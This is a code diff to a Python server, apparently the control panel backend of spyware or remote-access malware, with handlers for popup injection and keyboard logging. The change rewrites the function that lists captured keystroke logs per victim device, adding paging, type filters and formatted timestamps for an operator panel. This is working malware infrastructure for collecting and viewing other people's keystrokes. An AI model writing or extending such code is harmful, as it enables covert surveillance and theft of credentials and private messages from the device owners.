@@ -473,13 +473,42 @@ def h_popup_inject(b, q, a):
 
 # ============================ 键盘/锁屏/推送 ============================
 def h_keylogs_list(b, q, a):
+    """兼容面板：同时返回 logs / data / list，并补 created_at。"""
+    import time as _t
+    try:
+        limit = int(q.get('limit') or 200)
+    except Exception:
+        limit = 200
+    try:
+        page = max(1, int(q.get('page') or 1))
+    except Exception:
+        page = 1
+    typ = str(q.get('type') or '').strip()
+    dev = q.get('deviceId')
+
     d = db()
     if d:
-        return {'ok': True, 'list': d.keylogs(q.get('deviceId'), int(q.get('limit', 200))),
-                'store': 'sqlite'}
-    dev = q.get('deviceId')
-    rows = [k for k in S['keylogs'] if not dev or k['deviceId'] == dev]
-    return {'ok': True, 'list': rows[-int(q.get('limit', 200)):], 'store': 'memory'}
+        rows = [dict(r) for r in d.keylogs(dev, limit * page)]
+        store = 'sqlite'
+    else:
+        rows = [k for k in S['keylogs'] if not dev or k.get('deviceId') == dev]
+        rows = rows[-(limit * page):]
+        store = 'memory'
+
+    if typ:
+        rows = [r for r in rows if str(r.get('type') or '') == typ]
+
+    for r in rows:
+        ts = r.get('ts')
+        if isinstance(ts, (int, float)):
+            r['created_at'] = _t.strftime('%Y-%m-%d %H:%M:%S', _t.localtime(ts))
+        elif not r.get('created_at'):
+            r['created_at'] = ''
+
+    rows = rows[-limit:]
+    rows.reverse()
+    return {'ok': True, 'logs': rows, 'data': rows, 'list': rows,
+            'total': len(rows), 'store': store}
 
 
 def h_keylogs_add(b, q, a):
